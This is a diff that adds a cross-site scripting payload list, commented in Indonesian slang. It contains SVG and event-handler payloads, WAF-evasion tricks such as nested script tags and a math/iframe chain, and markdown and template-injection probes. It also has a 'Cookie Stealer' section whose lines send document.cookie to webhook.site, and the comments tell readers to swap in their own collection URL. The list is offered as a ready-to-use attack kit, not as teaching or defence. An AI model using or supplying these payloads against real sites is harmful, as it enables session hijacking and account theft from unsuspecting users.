@@ -1,0 +1,19 @@
+# 1. Basic & SVG Bypass (Modern & Stealth)
+<svg/onload=alert(1)>
+<details/open/ontoggle=alert(1)>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+
+# 2. Advanced Bypass (Nipu WAF yang galak)
+<scr<script>ipt>alert(1)</script>
+<a href="javascript:alert(1)">Click Me</a>
+<math><mtext><option><annotation><iframe/src=javascript:alert(1)>
+
+# 3. Cookie Stealer (The Real Mission! 🔥)
+# Ganti URL-nya pake Collaborator lu atau webhook.site
+<script>fetch('https://webhook.site/LU?c='+document.cookie);</script>
+<img src=x onerror="new Image().src='https://webhook.site/LU?c='+document.cookie;">
+
+# 4. Markdown & Template Injection (Buat ngetes form input)
+[XSS](javascript:alert(1))
+{{7*7}}  # Sapa tau dapet Client-Side Template Injection (CSTI)
